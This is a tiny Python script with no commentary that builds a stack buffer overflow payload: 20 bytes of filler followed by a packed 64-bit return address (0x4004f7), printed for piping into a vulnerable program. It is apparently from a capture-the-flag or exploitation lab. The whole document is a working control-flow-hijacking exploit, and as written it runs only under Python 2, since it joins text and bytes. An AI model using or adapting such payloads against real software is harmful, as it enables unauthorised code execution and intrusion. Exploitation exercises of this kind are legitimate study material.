import struct
junk = "AAAAAAAABBBBBBBBCCCC"
address = struct.pack("<Q",0x4004f7);

print(junk + address)
